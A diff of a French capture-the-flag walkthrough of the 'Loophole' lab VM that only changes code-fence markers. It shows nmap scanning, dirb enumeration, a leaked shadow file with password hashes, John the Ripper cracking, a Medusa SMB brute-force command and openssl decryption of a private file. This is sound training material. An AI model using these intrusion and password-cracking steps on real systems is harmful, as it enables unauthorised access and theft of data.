@@ -19,7 +19,7 @@ Finalement il faudra seulement aller dans *Fichier > Paramètres > Réseau* dans
 
 Après on peut lancer Nmap pour trouver l'adresse de notre future victime :  
 
-```plain
+```
 nmap -e vboxnet0 -sP 10.8.7.0/29 -T4
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-05 09:34 CEST
 Nmap scan report for 10.8.7.2
@@ -46,7 +46,7 @@ Il y a un sacré nombre de modules PHP mais on verra plus tard que cette info n'
 
 On lance un *dirb* sur le serveur *Apache* (1.3.31 avec PHP/4.4.4) :  
 
-```plain
+```
 > ./dirb http://10.8.7.2/ wordlists/big.txt 
 
 -----------------
@@ -82,7 +82,7 @@ DOWNLOADED: 20458 - FOUND: 7
 
 Surprise quand on regarde le fichier *garbage* :  
 
-```plain
+```
 root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
 smmsp:!!:9797:0:::::
 mysql:!!:9797:0:::::
@@ -96,7 +96,7 @@ tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
 
 On lance *John The Ripper* qui retourne illico un premier mot de passe :  
 
-```plain
+```
 Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [128/128 AVX intrinsics 12x])
 mhog             (mhog)
 ```
@@ -105,7 +105,7 @@ On laisse *JTR* tourner puis on passe à autre chose voir si on trouve autre cho
 
 On lance un scan Nmap de la cible (quand même) :  
 
-```plain
+```
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-05 13:26 CEST
 Nmap scan report for 10.8.7.2
 Host is up (0.00012s latency).
@@ -151,7 +151,7 @@ HOP RTT ADDRESS
 
 Est-ce qu'on peut faire quelque chose avec l'accès au Samba ?  
 
-```plain
+```
 > nmblookup -A 10.8.7.2
 Looking up status of 10.8.7.2
         LOOPHOLE        <00> -         B 
@@ -176,7 +176,7 @@ session setup failed: NT\_STATUS\_ACCESS\_DENIED
 
 On rajoute quelques lignes dans la section global de notre *smb.conf* :  
 
-```plain
+```
 client lanman auth = Yes
 client plaintext auth = Yes
 client ntlmv2 auth = No
@@ -184,14 +184,14 @@ client ntlmv2 auth = No
 
 Le changement est pas vraiment mieux :  
 
-```plain
+```
 > smbclient -L LOOPHOLE -U mhog%mhog
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
 
 *Medusa* a un module SMB, on tente d'obtenir un accès (par exemple sur le compte *operator* trouvé par *dirb*) :  
 
-```plain
+```
 medusa -h 10.8.7.2 -u operator -P john/wordlists/password.lst -M smbnt
 ```
 
@@ -210,7 +210,7 @@ On revient sur *JTR* que l'on stoppe et que l'on relance avec [une wordlist bét
 
 Cette fois les pass restants tombent en 8 minutes :  
 
-```plain
+```
 albatros         (root)
 nostradamus      (tskies)
 ```
@@ -219,13 +219,13 @@ On passe root via su et on trouve le ficier *Private.doc.enc* dans le home de l'
 
 On retrouve la commande de chiffrement dans son *.bash\_history* :  
 
-```plain
+```
 openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
 ```
 
 Le déchiffrement est aisé :  
 
-```plain
+```
 openssl enc -aes-256-cbc -d -in Private.doc.enc -out Private.doc -pass pass:nostradamus
 ```
 
